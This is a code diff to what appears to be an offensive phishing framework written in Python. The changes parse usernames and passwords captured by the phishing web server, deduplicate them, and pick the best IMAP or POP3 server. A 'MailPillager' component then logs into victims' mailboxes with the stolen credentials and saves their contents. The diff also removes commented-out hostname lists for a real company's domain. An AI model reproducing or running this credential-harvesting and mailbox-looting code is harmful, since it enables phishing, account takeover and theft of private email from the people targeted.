@@ -34,7 +34,11 @@ class Framework(object):
         self.server_list = {}
         self.profile_valid_web_templates = []
         self.profile_dynamic_web_templates = []
+        self.pillaged_users = []
+        self.bestMailServerPort = None
+        self.bestMailServer = None
         self.webserver = None   # web server process
+        self.webserverpid = None
         self.gather = None
         self.mp = None # mail pillager
 
@@ -72,21 +76,34 @@ class Framework(object):
     # SUPPORT METHODS
     #==================================================
 
-    def cleanup(self):
+    def ctrlc(self):
+        print
         self.display.alert("Ctrl-C caught!!!")
+        self.cleanup()
+
+    def cleanup(self):
+        print
         if (self.webserver is not None):
             if (self.config["daemon_web"]):
                 self.display.alert("Webserver is still running as requested.")
             else:
                 # send SIGTERM to the web process
-                self.display.output("stopping webserver")
+                self.display.output("stopping the webserver")
                 self.webserver.send_signal(signal.SIGINT)
                 # delete the pid file
                 os.remove(self.pid_path + "spfwebsrv.pid") 
+                # as a double check, manually kill the process
+                self.killProcess(self.webserverpid)
         # call report generation
         self.generateReport()
         # exit
         sys.exit(0)
+
+    def killProcess(self, pid):
+        if (os.path.exists("/proc/" + str(pid))):
+            self.display.alert("Killing process [%s]" % (pid))
+            os.kill(pid, signal.SIGKILL)
+            os.remove(self.pid_path + "spfwebsrv.pid") 
 
     def generateReport(self):
         self.display.output("Generating phishing report")
@@ -184,11 +201,11 @@ class Framework(object):
         advgroup.add_argument("--profile",
                             dest="profile_domain",
                             action='store_true',
-                            help="profile the target domain")
+                            help="profile the target domain (requires the --dns flag)")
         advgroup.add_argument("--pillage",
                             dest="pillage_email",
                             action='store_true',
-                            help="auto pillage email accounts")
+                            help="auto pillage email accounts (requires the --dns flag)")
 
         #==================================================
         # Optional Args
@@ -444,10 +461,7 @@ class Framework(object):
             self.display.verbose("Gathered [%s] hosts from DNS BruteForce/Dictionay Lookup" % (len(temp_list)))
             self.hostname_list += temp_list
 
-#            self.hostname_list = [ "3Dcommunity.rapid7.com", "3Dnse.extranet.rapid7.com", "3Dscanner2.labs.rapid7.com", "3Dupdates.rapid7.com", "BOSTONEX.tor.rapid7.com", "Community.rapid7.com", "autodiscover.rapid7.com", "blog.rapid7.com", "community.rapid7.com", "dev.rapid7.com", "download.rapid7.com", "download2.rapid7.com", "email.rapid7.com", "experttracks.rapid7.com", "filetransfer.rapid7.com", "go.rapid7.com", "help.rapid7.com", "info.rapid7.com", "information.rapid7.com", "insight.rapid7.com", "is-upnp-check.rapid7.com", "legacy.rapid7.com", "lists.rapid7.com", "lyncdiscover.rapid7.com", "mail.rapid7.com", "nse.extranet.rapid7.com", "owa.rapid7.com", "scanner1.labs.rapid7.com", "scanner2.labs.rapid7.com", "sip.rapid7.com", "sonar.labs.rapid7.com", "staging.rapid7.com", "support.rapid7.com", "testing.rapid7.com", "updates.rapid7.com", "upnp-check.rapid7.com", "va1.rapid7.com", "web1.rapid7.com", "web2.rapid7.com", "www.rapid7.com"]
-#            self.hostname_list = [ "autodiscover.rapid7.com", "email.rapid7.com", "mail.rapid7.com", "owa.rapid7.com" ]
-
-            # sort/unique ihostname list
+            # sort/unique hostname list
             self.hostname_list = Utils.unique_list(self.hostname_list)
             self.hostname_list.sort()
 
@@ -627,6 +641,7 @@ class Framework(object):
                 pidfile = open(pidfilename, 'w')
                 pidfile.write(str(self.webserver.pid))
                 pidfile.close()
+                self.webserverpid = self.webserver.pid
                 self.display.verbose("Started WebServer with pid = [%s]" % self.webserver.pid)
 
         #==================================================
@@ -776,6 +791,7 @@ class Framework(object):
         usermatch = re.match(".*username=\['(.*?)'\].*", line)
         if (usermatch):
             username = usermatch.group(1)
+
         passmatch = re.match(".*password=\['(.*?)'\].*", line)
         if (passmatch):
             password = passmatch.group(1)
@@ -783,18 +799,33 @@ class Framework(object):
         if ((not username) or (not password)):
             return
 
-        if (not self.mp):
-          self.mp = MailPillager()
+        if (not username+":"+password in self.pillaged_users):
+            self.pillaged_users.append(username+":"+password)
 
-        for host in self.server_list[143]:
-            self.mp.pillage(username=username, password=password, server=host, port=143, domain=self.config["domain_name"])
+            if (not self.mp):
+                self.mp = MailPillager()
 
-        for host in self.server_list[993]:
-            self.mp.pillage(username=username, password=password, server=host, port=993, domain=self.config["domain_name"])
+            if (not self.bestMailServer):
+                self.determineBestMailServer()
 
-        for host in self.server_list[110]:
-            self.mp.pillage(username=username, password=password, server=host, port=110, domain=self.config["domain_name"])
+            if (not self.bestMailServer):
+                self.display.error("No valid target IMAP/POP3 mail servers were identified.")
+                return
 
-        for host in self.server_list[995]:
-            self.mp.pillage(username=username, password=password, server=host, port=995, domain=self.config["domain_name"])
+            print self.bestMailServer + ":" + str(self.bestMailServerPort)
 
+            self.mp.pillage(username=username, password=password, server=self.bestMailServer, port=self.bestMailServerPort, domain=self.config["domain_name"], outputdir=self.logpath)
+
+    def determineBestMailServer(self):
+        if self.server_list[993]: # IMAPS
+            self.bestMailServerPort = 993
+            self.bestMailServer = self.server_list[993][0]
+        elif self.server_list[143]: #IMAP
+            self.bestMailServerPort = 143
+            self.bestMailServer = self.server_list[143][0]
+        elif self.server_list[995]: # POP3S
+            self.bestMailServerPort = 995
+            self.bestMailServer = self.server_list[995][0]
+        elif self.server_list[110]: # POP3
+            self.bestMailServerPort = 110
+            self.bestMailServer = self.server_list[110][0]
